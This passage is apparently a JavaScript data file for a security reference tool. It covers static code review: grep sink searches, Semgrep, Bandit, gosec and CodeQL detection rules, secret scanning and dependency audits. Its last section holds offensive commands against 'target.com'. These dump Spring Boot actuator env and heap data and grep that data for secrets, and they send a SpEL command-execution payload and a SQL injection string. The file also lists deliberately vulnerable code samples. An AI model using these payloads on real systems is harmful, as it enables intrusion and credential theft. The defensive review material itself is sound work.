export const sastTechniques = [
  {
    id: 'manual-review',
    title: 'Manual Code Review',
    subtitle: 'Trace user input from source to sink to identify injection points and auth gaps',
    tags: ['manual review', 'taint analysis', 'dangerous functions', 'route enumeration', 'sink tracing'],
    accentColor: 'cyan',
    overview: 'Manual code review traces user input from entry point to dangerous function. It finds logic flaws and auth gaps that automated tools miss, especially in complex business flows.',
    steps: [
      'Enumerate all routes: grep for decorators, router.get/post, urlpatterns — build a complete surface map',
      'Identify user-controlled sources: request.args, req.body, $_GET, $_POST, headers',
      'Trace each source to dangerous sinks: eval(), exec(), db.query(), innerHTML, render()',
      'Verify authentication decorators on every route — any missing decorator is an exposed endpoint',
      'Search for hardcoded secrets: API keys, passwords, JWT secrets embedded in source files',
      'Check for unsafe patterns: SQL string concatenation, eval of input, unsafe deserialization',
    ],
    commands: [
      {
        title: 'Route enumeration — all languages',
        code: `# Python (Flask / Django)
grep -rn "@app.route\\|@bp.route\\|path(\\|re_path(" . --include="*.py"
grep -rn "urlpatterns" . --include="*.py" -A 30

# Node.js (Express)
grep -rn "app\\.get\\|app\\.post\\|app\\.put\\|app\\.delete\\|router\\." . --include="*.js" --include="*.ts"

# Java (Spring)
grep -rn "@RequestMapping\\|@GetMapping\\|@PostMapping\\|@PutMapping\\|@DeleteMapping" . --include="*.java"

# PHP (Laravel)
grep -rn "Route::\\|\\$router->" . --include="*.php"

# Ruby on Rails
grep -rn "get '\\|post '\\|put '\\|delete '\\|resources :" config/routes.rb`
      },
      {
        title: 'Taint source identification',
        code: `# Python user-controlled input sources
grep -rn "request\\.args\\|request\\.form\\|request\\.json\\|request\\.data\\|request\\.headers" . --include="*.py"
grep -rn "request\\.GET\\|request\\.POST\\|request\\.body\\|request\\.META" . --include="*.py"

# Node.js / TypeScript
grep -rn "req\\.body\\|req\\.query\\|req\\.params\\|req\\.headers" . --include="*.js" --include="*.ts"

# PHP
grep -rn "\\$_GET\\|\\$_POST\\|\\$_REQUEST\\|\\$_COOKIE\\|\\$_FILES\\|\\$_SERVER" . --include="*.php"

# Java (Spring)
grep -rn "@RequestParam\\|@PathVariable\\|@RequestBody\\|getParameter\\|getHeader" . --include="*.java"

# Ruby on Rails
grep -rn "params\\[\\|request\\.body\\|cookies\\[" . --include="*.rb"`
      },
      {
        title: 'Dangerous sink grep — all languages',
        code: `# ── OS COMMAND EXECUTION ──────────────────────────────
# Python
grep -rn "os\\.system\\|os\\.popen\\|subprocess\\|exec(\\|shell=True" . --include="*.py"
# Node.js
grep -rn "exec(\\|execSync(\\|spawn(\\|child_process" . --include="*.js"
# PHP
grep -rn "system(\\|exec(\\|shell_exec(\\|passthru(\\|popen(" . --include="*.php"
# Java
grep -rn "Runtime\\.exec\\|ProcessBuilder" . --include="*.java"

# ── SQL INJECTION ──────────────────────────────────────
# Python
grep -rn 'f"SELECT\\|f"INSERT\\|f"UPDATE\\|f"DELETE\\|%.*SELECT\\|\\.format.*SELECT' . --include="*.py"
# PHP
grep -rn '".*SELECT.*\\$\\|mysql_query\\|\\. \\$' . --include="*.php"
# Java
grep -rn '"SELECT.*"\\s*+\\|createNativeQuery("' . --include="*.java"

# ── DESERIALIZATION ────────────────────────────────────
# Python
grep -rn "pickle\\.loads\\|yaml\\.load(\\|marshal\\.loads\\|jsonpickle" . --include="*.py"
# PHP
grep -rn "unserialize(" . --include="*.php"
# Java
grep -rn "ObjectInputStream\\|readObject(\\|XMLDecoder\\|XStream" . --include="*.java"
# .NET
grep -rn "BinaryFormatter\\|JsonConvert\\.DeserializeObject" . --include="*.cs"

# ── HARDCODED SECRETS ──────────────────────────────────
grep -rn "password\\s*=\\s*['\"][^'\"]*['\"]" . --include="*.py" --include="*.js"
grep -rn "api_key\\s*=\\|secret\\s*=\\|AWS_SECRET" . --include="*.py"
grep -rn "-----BEGIN.*PRIVATE KEY-----" . -r
grep -rn "AKIA[0-9A-Z]{16}" . -r   # AWS access key pattern

# ── TEMPLATE INJECTION (SSTI) ──────────────────────────
grep -rn "render_template_string\\|Template(.*request\\|jinja2\\.Template(" . --include="*.py"

# ── SSRF SINKS ─────────────────────────────────────────
grep -rn "requests\\.get\\|urllib\\.request\\|http\\.get\\|redirect(" . --include="*.py"
grep -rn "fetch(\\|axios\\.get\\|http\\.get(" . --include="*.js"

# ── INSECURE CONFIGS ───────────────────────────────────
grep -rn "DEBUG\\s*=\\s*True\\|verify\\s*=\\s*False\\|ssl.*=.*false" . --include="*.py"
grep -rn "cors.*origin.*\\*\\|allowedOrigins.*\\*" . --include="*.js" --include="*.java"`
      }
    ]
  },

  // ─── SEMGREP ───────────────────────────────────────────────────────────────
  {
    id: 'sast-semgrep',
    title: 'SAST — Semgrep Deep Dive',
    subtitle: 'AST-aware pattern scanning, custom rules, taint mode, and CI/CD integration',
    tags: ['Semgrep', 'custom rules', 'taint mode', 'metavariables', 'OWASP', 'CI/CD', 'SARIF'],
    accentColor: 'cyan',
    overview: 'Semgrep matches code patterns using an AST-aware engine that understands code structure, not just text. Custom rules catch application-specific vulnerabilities. Taint mode traces user input to sinks across function boundaries — something grep-based SAST cannot do.',
    steps: [
      'Run pre-built rulesets first: p/owasp-top-ten, p/sql-injection, p/xss, p/secrets, p/jwt',
      'Use --json output and pipe to jq to triage high-severity findings',
      'Write custom rules in YAML: match specific function call shapes using patterns and metavariables ($X)',
      'Use pattern-not to exclude safe patterns (e.g. parameterized queries) and reduce false positives',
      'Enable taint mode with pattern-sources and pattern-sinks to track user input across calls',
      'Integrate semgrep ci into GitHub Actions / GitLab CI — fails the build on ERROR severity findings',
    ],
    commands: [
      {
        title: 'Built-in rulesets',
        code: `# Full OWASP Top 10
semgrep --config p/owasp-top-ten . --json -o owasp.json

# Specific vuln classes
semgrep --config p/sql-injection .
semgrep --config p/xss .
semgrep --config p/command-injection .
semgrep --config p/path-traversal .
semgrep --config p/ssrf .
semgrep --config p/xxe .
semgrep --config p/secrets .
semgrep --config p/jwt .
semgrep --config p/insecure-transport .

# Framework-specific packs
semgrep --config p/flask .
semgrep --config p/django .
semgrep --config p/express .
semgrep --config p/java .
semgrep --config p/php .

# Run multiple + high severity only, exclude test dirs
semgrep --config p/owasp-top-ten --config p/secrets . \\
  --severity ERROR \\
  --exclude "tests/" --exclude "*_test.py" \\
  --json -o results.json

# Parse findings
cat results.json | jq '.results[] | {file:.path, line:.start.line, rule:.check_id, msg:.extra.message}'`
      },
      {
        title: 'Custom rules — SQL injection',
        code: `# rules/sqli.yaml
rules:
  # Python f-string SQL injection
  - id: python-fstring-sqli
    pattern: $CURSOR.execute(f"... {$VAR} ...")
    message: "SQL injection: f-string var $VAR interpolated directly into execute()"
    languages: [python]
    severity: ERROR
    metadata:
      cwe: "CWE-89"

  # Python % / .format() SQL injection
  - id: python-format-sqli
    pattern-either:
      - pattern: $CURSOR.execute("..." % $VAR)
      - pattern: $CURSOR.execute("...".format(...))
    message: "SQL injection via string formatting in execute()"
    languages: [python]
    severity: ERROR

  # SQLAlchemy text() with concatenation
  - id: sqlalchemy-text-sqli
    pattern: sqlalchemy.text("..." + $VAR)
    message: "SQL injection via sqlalchemy.text() concatenation"
    languages: [python]
    severity: ERROR

  # Node.js string concat in query
  - id: node-string-concat-sqli
    pattern-either:
      - pattern: $DB.query("SELECT" + $INPUT)
      - pattern: $DB.query(\`SELECT ${"..."}\`)
    message: "SQL injection via string concatenation in DB query"
    languages: [javascript, typescript]
    severity: ERROR

  # Java Statement (not PreparedStatement)
  - id: java-statement-sqli
    patterns:
      - pattern: $STMT.execute("..." + $VAR)
      - pattern-not: $STMT instanceof PreparedStatement
    message: "SQL injection: raw Statement.execute() with string concatenation"
    languages: [java]
    severity: ERROR

semgrep --config rules/sqli.yaml . --json`
      },
      {
        title: 'Custom rules — command injection',
        code: `# rules/cmdi.yaml
rules:
  - id: python-os-system-concat
    pattern-either:
      - pattern: os.system($CMD % $X)
      - pattern: os.system(f"... {$X} ...")
      - pattern: os.system("..." + $X)
    message: "Command injection: os.system() with user-controlled input $X"
    languages: [python]
    severity: ERROR

  - id: python-subprocess-shell-true
    pattern: subprocess.$FUNC(..., shell=True, ...)
    message: "subprocess with shell=True — dangerous if input is user-controlled"
    languages: [python]
    severity: WARNING

  - id: node-exec-noliteral
    patterns:
      - pattern: exec($CMD)
      - pattern-not: exec("...", ...)
    message: "exec() called with non-literal — potential command injection"
    languages: [javascript]
    severity: ERROR

  - id: php-system-userinput
    pattern-either:
      - pattern: system($_GET[$X])
      - pattern: system($_POST[$X])
      - pattern: exec($_REQUEST[$X])
      - pattern: shell_exec($_GET[$X])
    message: "Command injection: OS function called with raw user input"
    languages: [php]
    severity: ERROR

  - id: java-runtime-exec
    patterns:
      - pattern: Runtime.getRuntime().exec($CMD)
      - pattern-not: Runtime.getRuntime().exec("...")
    message: "Command injection: Runtime.exec() with non-literal argument"
    languages: [java]
    severity: ERROR`
      },
      {
        title: 'Custom rules — taint mode (SSRF)',
        code: `# rules/taint-ssrf.yaml
# Taint mode: trace Flask request params → outbound HTTP calls
rules:
  - id: python-flask-ssrf
    mode: taint
    pattern-sources:
      - patterns:
          - pattern: request.args.get(...)
          - pattern: request.form.get(...)
          - pattern: request.json.get(...)
          - pattern: request.GET.get(...)
          - pattern: request.POST.get(...)
    pattern-sinks:
      - patterns:
          - pattern: requests.get($URL, ...)
          - pattern: requests.post($URL, ...)
          - pattern: urllib.request.urlopen($URL)
          - pattern: httpx.get($URL, ...)
          - pattern: aiohttp.ClientSession().get($URL)
    message: "SSRF: Flask request parameter flows into outbound HTTP call"
    languages: [python]
    severity: ERROR

  - id: node-express-ssrf
    mode: taint
    pattern-sources:
      - pattern: req.query.$X
      - pattern: req.body.$X
      - pattern: req.params.$X
    pattern-sinks:
      - pattern: axios.get($URL, ...)
      - pattern: axios.post($URL, ...)
      - pattern: fetch($URL, ...)
      - pattern: http.get($URL, ...)
      - pattern: https.get($URL, ...)
    message: "SSRF: Express request parameter flows into outbound HTTP call"
    languages: [javascript, typescript]
    severity: ERROR

semgrep --config rules/taint-ssrf.yaml . --json`
      },
      {
        title: 'Custom rules — SSTI & XSS',
        code: `# rules/ssti-xss.yaml
rules:
  # Jinja2 SSTI — user input as template
  - id: python-jinja2-ssti
    patterns:
      - pattern: jinja2.Template($X).render(...)
      - pattern-not: jinja2.Template("...").render(...)
    message: "SSTI: jinja2.Template() called with non-literal string"
    languages: [python]
    severity: ERROR

  # Flask render_template_string with variable
  - id: flask-render-template-string-ssti
    patterns:
      - pattern: flask.render_template_string($X, ...)
      - pattern-not: flask.render_template_string("...", ...)
    message: "SSTI: render_template_string() called with non-literal template"
    languages: [python]
    severity: ERROR

  # Django template from user string
  - id: django-template-ssti
    patterns:
      - pattern: django.template.Template($X)
      - pattern-not: django.template.Template("...")
    message: "SSTI: Django Template() constructed from non-literal string"
    languages: [python]
    severity: ERROR

  # React dangerouslySetInnerHTML
  - id: react-dangerous-inner-html
    pattern: dangerouslySetInnerHTML={{__html: $X}}
    message: "XSS: dangerouslySetInnerHTML with potentially unsanitized value $X"
    languages: [javascript, typescript]
    severity: WARNING

  # Node.js res.send with tainted input
  - id: node-xss-res-send
    mode: taint
    pattern-sources:
      - pattern: req.query.$X
      - pattern: req.body.$X
      - pattern: req.params.$X
    pattern-sinks:
      - pattern: res.send($TAINTED)
      - pattern: res.write($TAINTED)
    message: "XSS: Unsanitized request parameter reflected in HTTP response"
    languages: [javascript]
    severity: ERROR`
      },
      {
        title: 'Semgrep CI/CD integration',
        code: `# GitHub Actions — .github/workflows/semgrep.yml
name: Semgrep SAST
on: [push, pull_request]
jobs:
  semgrep:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      - uses: returntocorp/semgrep-action@v1
        with:
          config: >-
            p/owasp-top-ten
            p/secrets
            p/sql-injection
            p/command-injection
          generateSarif: "1"
      - uses: github/codeql-action/upload-sarif@v2
        with:
          sarif_file: semgrep.sarif

# GitLab CI
semgrep-sast:
  image: returntocorp/semgrep
  script:
    - semgrep --config p/owasp-top-ten --config p/secrets .
        --json -o gl-sast-report.json --error
  artifacts:
    reports:
      sast: gl-sast-report.json

# Pre-commit hook — .pre-commit-config.yaml
repos:
  - repo: https://github.com/returntocorp/semgrep
    rev: v1.45.0
    hooks:
      - id: semgrep
        args: ['--config', 'p/secrets', '--config', 'rules/', '--error']`
      }
    ]
  },

  // ─── BANDIT & GOSEC ────────────────────────────────────────────────────────
  {
    id: 'sast-bandit-gosec',
    title: 'SAST — Bandit (Python) & gosec (Go)',
    subtitle: 'Full B-code and G-code reference with severity levels and CI integration',
    tags: ['Bandit', 'gosec', 'Python', 'Go', 'B602', 'B608', 'G304', 'G402', 'B-codes', 'G-codes'],
    accentColor: 'cyan',
    overview: 'Bandit maps every finding to a B-code (B101–B703) for a specific vulnerability class. gosec does the same for Go with G-codes. Knowing the full catalog lets you target the highest-impact checks precisely and suppress verified false positives.',
    steps: [
      'Run bandit -r . -ll for medium+ severity, -lll for high-only',
      'Target the most critical B-codes: B602/B605 (command injection), B608 (SQLi), B301 (pickle), B506 (yaml.load)',
      'Use -f json output for pipeline integration and automated triage',
      'Run gosec ./... on Go projects — key rules: G107 (SSRF), G201/G202 (SQLi), G304 (path traversal), G402 (TLS)',
      'Suppress verified false positives with # nosec B-code or // #nosec G-code inline comments',
    ],
    commands: [
      {
        title: 'Bandit usage',
        code: `bandit -r . -ll                            # Medium+ severity
bandit -r . -lll                           # High only
bandit -r . -f json -o bandit.json         # JSON output
bandit -r . -f html -o bandit.html         # HTML report
bandit -r . -x tests/,venv/,migrations/   # Exclude dirs
bandit -r . -t B602,B605,B608             # Only specific tests
bandit -r . --skip B101,B311              # Skip noisy tests

# Parse JSON — show only HIGH confidence + HIGH severity
cat bandit.json | jq '.results[] | select(.issue_severity=="HIGH" and .issue_confidence=="HIGH")'`
      },
      {
        title: 'Bandit B-code reference (complete)',
        code: `# ── EXECUTION / CODE INJECTION ───────────────────────
# B102  exec used
# B307  eval() used
# B604  function call with shell=True
# B605  os.system()                           ← HIGH PRIORITY
# B606  os.popen()
# B607  partial executable path in subprocess

# ── SUBPROCESS ────────────────────────────────────────
# B602  subprocess.Popen with shell=True      ← HIGH PRIORITY
# B603  subprocess.Popen without shell=True (still flag)
# B604  any function call with shell=True
# B601  paramiko exec_command with user input

# ── SQL INJECTION ─────────────────────────────────────
# B608  hardcoded SQL string construction     ← HIGH PRIORITY
# B610  django .extra() used
# B611  django RawSQL() used

# ── DESERIALIZATION ───────────────────────────────────
# B301  pickle / cPickle import               ← HIGH PRIORITY
# B302  marshal import
# B403  import pickle (any usage)
# B506  yaml.load() without Loader=SafeLoader ← HIGH PRIORITY

# ── WEAK CRYPTO / HASH ────────────────────────────────
# B303  md5 / sha1 used (weak hash)
# B304  des / rc2 / rc4 / blowfish (weak cipher)
# B305  cipher ECB mode
# B324  hashlib insecure function
# B505  weak crypto key (RSA/DSA < 2048 bits)

# ── HARDCODED CREDENTIALS ─────────────────────────────
# B104  hardcoded bind all interfaces (0.0.0.0)
# B105  hardcoded password string literal     ← HIGH PRIORITY
# B106  hardcoded password function argument
# B107  hardcoded password default argument

# ── SSL / TLS ─────────────────────────────────────────
# B323  unverified SSL context
# B501  requests with verify=False            ← HIGH PRIORITY
# B502  ssl.wrap_socket with no cert reqs
# B503  ssl — bad cipher suites
# B504  ssl — no version requirement

# ── XML / XXE ─────────────────────────────────────────
# B313-320  various xml parsers vulnerable to XXE
# B405  import xml.etree
# B410  import lxml

# ── WEB FRAMEWORK ─────────────────────────────────────
# B201  Flask app.run(debug=True)
# B703  django mark_safe (potential XSS)
# B308  django mark_safe in template

# ── MISCELLANEOUS ─────────────────────────────────────
# B101  assert used (stripped with -O flag)
# B108  insecure temp file/dir
# B311  random.random() not cryptographically strong
# B321  FTP usage (plaintext)
# B411  xmlrpc import`
      },
      {
        title: 'gosec usage & G-code reference',
        code: `gosec ./...
gosec -fmt json ./... > gosec.json
gosec -fmt sarif ./... > gosec.sarif      # GitHub SARIF upload
gosec -include G304,G402,G501 ./...      # Target specific rules
gosec -exclude G104 ./...                # Exclude noisy rules (unhandled errors)
gosec -severity high ./...               # High severity only

# ── INJECTION ─────────────────────────────────────────
# G201  SQL query via fmt.Sprintf()         ← HIGH PRIORITY
# G202  SQL query via string concatenation  ← HIGH PRIORITY
# G203  unescaped data in HTML template
# G204  subprocess with variable arg        ← HIGH PRIORITY

# ── FILE OPERATIONS ───────────────────────────────────
# G304  file path from user input (traversal) ← HIGH PRIORITY
# G305  file traversal when extracting zip
# G306  poor file permissions when writing
# G301  poor file permissions on mkdir
# G302  poor file permissions with chmod
# G303  temp file in shared /tmp

# ── NETWORK / HTTP ────────────────────────────────────
# G107  HTTP request with taint URL (SSRF)  ← HIGH PRIORITY
# G102  bind to all interfaces
# G108  /debug/pprof exposed
# G112  insecure ReadHeaderTimeout
# G114  net/http serve without timeout

# ── TLS / CRYPTO ──────────────────────────────────────
# G402  TLS InsecureSkipVerify = true        ← HIGH PRIORITY
# G403  RSA key < 2048 bits
# G404  math/rand not crypto/rand
# G401  DES or RC2 cipher
# G501  import md5 (weak hash)              ← HIGH PRIORITY
# G505  import sha1 (weak hash)

# ── CREDENTIALS / SECRETS ─────────────────────────────
# G101  hardcoded credentials
# G106  ssh.InsecureIgnoreHostKey

# ── MISC ──────────────────────────────────────────────
# G103  use of unsafe package
# G109  integer overflow on type conversion
# G110  decompression bomb (zip bomb risk)

# Suppress false positive:
// #nosec G204 -- input validated above
exec.Command(input)`
      }
    ]
  },

  // ─── CODEQL ────────────────────────────────────────────────────────────────
  {
    id: 'sast-codeql',
    title: 'SAST — CodeQL Deep Dive',
    subtitle: 'Interprocedural taint tracking, custom QL queries, and GitHub Advanced Security',
    tags: ['CodeQL', 'QL', 'taint tracking', 'data flow', 'SARIF', 'GitHub Advanced Security', 'CWE-089', 'CWE-918'],
    accentColor: 'cyan',
    overview: 'CodeQL converts source code into a relational database and queries it with QL — a declarative logic language. Unlike pattern matchers, it performs full interprocedural taint analysis, following user input across function calls, object assignments, and library boundaries.',
    steps: [
      'Create a database with codeql database create for the target language',
      'Run the security-extended suite — much broader than the default security-and-quality',
      'Write custom QL queries using TaintTracking::Configuration to model app-specific sources/sinks',
      'Use path-problem kind to get full source→sink data flow paths in results',
      'Upload SARIF to GitHub to display findings inline in pull request diffs',
      'Use CodeQL VS Code extension for interactive query development',
    ],
    commands: [
      {
        title: 'Database creation — all languages',
        code: `# Python
codeql database create codeql-db --language=python --source-root=. --overwrite

# JavaScript / TypeScript
codeql database create codeql-db --language=javascript --source-root=.

# Java (needs build)
codeql database create codeql-db --language=java \\
  --command="mvn clean install -DskipTests" --source-root=.

# Go
codeql database create codeql-db --language=go --source-root=.

# C / C++
codeql database create codeql-db --language=cpp --command="make"

# C#
codeql database create codeql-db --language=csharp --command="dotnet build"

# Run security-extended suite
codeql database analyze codeql-db \\
  codeql/python-queries:codeql-suites/python-security-extended.qls \\
  --format=sarif-latest --output=results.sarif

# Parse SARIF
cat results.sarif | jq '.runs[].results[] | {rule:.ruleId, file:.locations[0].physicalLocation.artifactLocation.uri, line:.locations[0].physicalLocation.region.startLine}'`
      },
      {
        title: 'Custom QL — Python SQL injection',
        code: `/**
 * @name SQL injection from Flask request parameters
 * @kind path-problem
 * @id python/flask-sqli
 * @problem.severity error
 * @tags security external/cwe/cwe-089
 */
import python
import semmle.python.dataflow.new.DataFlow
import semmle.python.dataflow.new.TaintTracking
import semmle.python.ApiGraphs

// ── SOURCE: Flask request parameters ──────────────────
class FlaskRequestSource extends DataFlow::Node {
  FlaskRequestSource() {
    exists(DataFlow::AttrRead ar |
      ar.getObject() = API::moduleImport("flask").getMember("request").getAUse() and
      ar.getAttributeName() in ["args", "form", "json", "data", "headers", "values"] and
      this = ar
    )
  }
}

// ── SINK: raw SQL execution ────────────────────────────
class SqlExecSink extends DataFlow::Node {
  SqlExecSink() {
    exists(DataFlow::CallCfgNode call |
      call.getFunction().(DataFlow::AttrRead).getAttributeName() in
        ["execute", "executemany", "raw", "extra"] and
      this = call.getArg(0)
    )
  }
}

// ── TAINT CONFIG ──────────────────────────────────────
class SqlInjConfig extends TaintTracking::Configuration {
  SqlInjConfig() { this = "SqlInjConfig" }
  override predicate isSource(DataFlow::Node n) { n instanceof FlaskRequestSource }
  override predicate isSink(DataFlow::Node n) { n instanceof SqlExecSink }
}

import DataFlow::PathGraph
from SqlInjConfig cfg, DataFlow::PathNode src, DataFlow::PathNode sink
where cfg.hasFlowPath(src, sink)
select sink.getNode(), src, sink,
  "SQL injection: user input from $@ flows into raw SQL",
  src.getNode(), "this request parameter"`
      },
      {
        title: 'Custom QL — SSRF and path traversal',
        code: `/**
 * @name SSRF: user-controlled URL in outbound HTTP request
 * @kind path-problem
 * @id python/ssrf
 * @problem.severity error
 * @tags security external/cwe/cwe-918
 */
import python
import semmle.python.dataflow.new.TaintTracking
import semmle.python.ApiGraphs

class UserInputSource extends DataFlow::Node {
  UserInputSource() {
    this = API::moduleImport("flask").getMember("request")
              .getMember(["args","form","json","values"]).getAUse()
  }
}

class OutboundHttpSink extends DataFlow::Node {
  OutboundHttpSink() {
    exists(DataFlow::CallCfgNode c |
      c.getFunction() = API::moduleImport("requests")
                           .getMember(["get","post","put","delete","request"]).getAUse() and
      this = c.getArg(0)
    )
    or
    exists(DataFlow::CallCfgNode c |
      c.getFunction() = API::moduleImport("urllib.request").getMember("urlopen").getAUse() and
      this = c.getArg(0)
    )
  }
}

class SsrfConfig extends TaintTracking::Configuration {
  SsrfConfig() { this = "SsrfConfig" }
  override predicate isSource(DataFlow::Node n) { n instanceof UserInputSource }
  override predicate isSink(DataFlow::Node n) { n instanceof OutboundHttpSink }
}

// ── Path traversal variant (file open with user path) ─
class FileOpenSink extends DataFlow::Node {
  FileOpenSink() {
    exists(DataFlow::CallCfgNode c |
      c.getFunction().(DataFlow::AttrRead).getAttributeName() = "open" and
      this = c.getArg(0)
    )
  }
}

import DataFlow::PathGraph
from SsrfConfig cfg, DataFlow::PathNode src, DataFlow::PathNode sink
where cfg.hasFlowPath(src, sink)
select sink.getNode(), src, sink, "SSRF: user input flows to HTTP request URL"`
      },
      {
        title: 'CodeQL GitHub Actions',
        code: `# .github/workflows/codeql.yml
name: CodeQL
on:
  push:
    branches: [main, develop]
  pull_request:
    branches: [main]
  schedule:
    - cron: '0 6 * * 1'   # Weekly

jobs:
  analyze:
    runs-on: ubuntu-latest
    permissions:
      security-events: write
      contents: read

    strategy:
      matrix:
        language: ['python', 'javascript']

    steps:
      - uses: actions/checkout@v3

      - name: Initialize CodeQL
        uses: github/codeql-action/init@v2
        with:
          languages: ${'$'}{{ matrix.language }}
          queries: security-extended   # More coverage than default

      - name: Autobuild
        uses: github/codeql-action/autobuild@v2

      - name: Analyze
        uses: github/codeql-action/analyze@v2
        with:
          category: "/language:${'$'}{{ matrix.language }}"
          upload: true   # Sends to GitHub Security tab`
      }
    ]
  },

  // ─── SECRETS & DEPS ────────────────────────────────────────────────────────
  {
    id: 'sast-secrets-deps',
    title: 'SAST — Secret Scanning & Dependency Audits',
    subtitle: 'Trufflehog, Gitleaks, trivy, npm audit — leaked secrets and vulnerable dependencies',
    tags: ['Trufflehog', 'Gitleaks', 'trivy', 'npm audit', 'pip-audit', 'govulncheck', 'SBOM', 'SCA'],
    accentColor: 'cyan',
    overview: 'Secrets committed to git history survive deletions and renames — every commit must be scanned. SCA (Software Composition Analysis) identifies third-party packages with known CVEs. Both are non-negotiable parts of a complete code review.',
    steps: [
      'Run trufflehog against the full git history with --only-verified to reduce noise',
      'Run gitleaks with --log-opts="--all" to cover every branch and tag',
      'Use trivy fs for filesystem/container scanning including OS packages and language deps',
      'Run language-native audits: npm audit, pip-audit, govulncheck, cargo audit, bundle audit',
      'Generate an SBOM with syft or trivy for a complete software bill of materials',
      'Block CI/CD deployments on CRITICAL CVEs with trivy --exit-code 1',
    ],
    commands: [
      {
        title: 'Trufflehog',
        code: `# Full git history scan
trufflehog git file:///path/to/repo --only-verified --json | jq .

# Remote GitHub repo
trufflehog github --repo=https://github.com/org/repo --only-verified --json

# Entire GitHub org
trufflehog github --org=target-org --json

# Docker image
trufflehog docker --image=myapp:latest

# Filesystem (non-git)
trufflehog filesystem /path/to/dir --json

# S3 bucket
trufflehog s3 --bucket=my-bucket

# Extract readable output
trufflehog git file:///repo --json 2>/dev/null | \\
  jq -r '.SourceMetadata.Data.Git | "\\(.commit) — \\(.file)::\\(.line)"'`
      },
      {
        title: 'Gitleaks',
        code: `# Scan current directory
gitleaks detect --source . -v

# Scan all history (all branches)
gitleaks detect --source . --log-opts="--all" -v

# JSON report
gitleaks detect --source . --report-format json --report-path leaks.json

# Custom rule — .gitleaks.toml
[[rules]]
id = "custom-api-key"
description = "Internal App API Key"
regex = '''myapp_[a-zA-Z0-9]{32}'''
tags = ["api", "custom"]

gitleaks detect --source . --config .gitleaks.toml

# Pre-commit hook (staged files only)
gitleaks protect --staged -v

# GitHub Actions
- name: Gitleaks
  uses: gitleaks/gitleaks-action@v2
  env:
    GITHUB_TOKEN: ${'$'}{{ secrets.GITHUB_TOKEN }}`
      },
      {
        title: 'Trivy & language audits',
        code: `# ── TRIVY ─────────────────────────────────────────────
trivy fs . --severity HIGH,CRITICAL
trivy fs . --scanners vuln,secret,misconfig --severity HIGH,CRITICAL
trivy fs . --format json -o trivy.json --severity HIGH,CRITICAL
trivy fs . --format sarif -o trivy.sarif              # GitHub upload
trivy fs . --ignore-unfixed --severity HIGH,CRITICAL  # Reduce noise
trivy fs . --exit-code 1 --severity CRITICAL          # Fail CI
trivy image myapp:latest --severity HIGH,CRITICAL
trivy config ./k8s/ --severity HIGH,CRITICAL          # K8s manifests

# Generate SBOM
trivy fs . --format cyclonedx -o sbom.json
syft . -o spdx-json > sbom-spdx.json

# ── LANGUAGE AUDITS ────────────────────────────────────
# Node.js
npm audit --json
npm audit fix
npx audit-ci --critical   # Fail CI on critical

# Python
pip-audit -r requirements.txt --format json -o pip-audit.json
safety check -r requirements.txt --full-report

# Go
govulncheck ./...

# Ruby
bundle audit check --update

# Java
mvn org.owasp:dependency-check-maven:check

# PHP
composer audit

# Rust
cargo audit`
      }
    ]
  },

  // ─── FRAMEWORK VULNS ───────────────────────────────────────────────────────
  {
    id: 'framework-vulns',
    title: 'Framework-Specific Vulnerabilities',
    subtitle: 'Django, Rails, Spring Boot, PHP, Express — patterns, grep, and exploitation',
    tags: ['Django', 'Rails', 'Spring Boot', 'PHP', 'Express', 'Laravel', 'SpEL', 'type juggling', 'prototype pollution'],
    accentColor: 'cyan',
    overview: 'Each framework has recurring vulnerability patterns tied to its ORM, template engine, and configuration. Knowing these patterns allows targeted review without reading the entire codebase.',
    steps: [
      'Django: grep for raw(), extra(), RawSQL() — any with string interpolation is SQLi',
      'Rails: grep for where("...#{params"), YAML.load, redirect_to params — common injection points',
      'Spring Boot: probe /actuator — /env and /heapdump leak secrets and heap memory',
      'PHP: test loose == with type juggling magic hashes; unserialize() with PHPGGC gadget chains',
      'Express.js: test __proto__ injection via merge/extend endpoints for prototype pollution',
    ],
    commands: [
      {
        title: 'Django & Rails',
        code: `# ── DJANGO ────────────────────────────────────────────
# Grep for dangerous ORM patterns
grep -rn "\\.raw(\\|\\.extra(\\|RawSQL(" . --include="*.py"

# Vulnerable patterns:
User.objects.raw("SELECT * FROM users WHERE id=" + user_id)
User.objects.extra(where=["username='%s'" % username])
# Safe: User.objects.raw("SELECT * FROM users WHERE id=%s", [user_id])

# Template injection if user controls template string
from django.template import Template, Context
template = Template(user_input)   # SSTI if input contains {{ }}
rendered = template.render(Context({}))

# Django misconfigs
grep -rn "DEBUG\\s*=\\s*True" . --include="*.py"       # Stack traces exposed
grep -rn "SECRET_KEY\\s*=" . --include="*.py"           # Hardcoded key
grep -rn "ALLOWED_HOSTS.*\\*" . --include="*.py"        # Host header injection
grep -rn "CORS_ALLOW_ALL_ORIGINS\\s*=\\s*True" . --include="*.py"

# ── RAILS ─────────────────────────────────────────────
# Grep for SQL injection
grep -rn "where(\".*#\{\\|where(\".*\\+" . --include="*.rb"

# Vulnerable:
User.where("name = '#{params[:name]}'")
# Exploit: name = "' OR '1'='1"
# Safe: User.where("name = ?", params[:name])

# Mass assignment — missing strong params
grep -rn "@user = User.new(params\\|@user.update(params" . --include="*.rb"

# YAML deserialization
grep -rn "YAML\\.load(" . --include="*.rb"
# Vulnerable: YAML.load(user_input)
# Safe:       YAML.safe_load(user_input)

# Open redirect
grep -rn "redirect_to params\\|redirect_to request\\." . --include="*.rb"`
      },
      {
        title: 'Spring Boot & Java',
        code: `# ── SPRING BOOT ACTUATOR ──────────────────────────────
curl http://target.com/actuator                    # List endpoints
curl http://target.com/actuator/env                # Env vars + secrets
curl http://target.com/actuator/heapdump           # JVM heap dump
curl http://target.com/actuator/mappings           # All route mappings
curl http://target.com/actuator/loggers            # Modify log levels at runtime

# Extract secrets from heap dump
wget http://target.com/actuator/heapdump -O heap.bin
strings heap.bin | grep -iE "password|secret|token|api.key|jdbc|key="

# ── SPEL INJECTION ─────────────────────────────────────
# Payload: T(java.lang.Runtime).getRuntime().exec('id')
curl "https://target.com/api/search?q=T(java.lang.Runtime).getRuntime().exec('id')"

# Grep in code
grep -rn "SpelExpressionParser\\|parseExpression\\|ELProcessor" . --include="*.java"
grep -rn "@Value.*#\{\\|\\.parseExpression(" . --include="*.java"

# ── SPRING SECURITY GAPS ──────────────────────────────
grep -rn "permitAll()\\|antMatchers.*permitAll\\|csrf().disable()" . --include="*.java"

# ── JPA NATIVE QUERY INJECTION ────────────────────────
grep -rn "@Query.*nativeQuery.*=.*true" . --include="*.java" -A 2
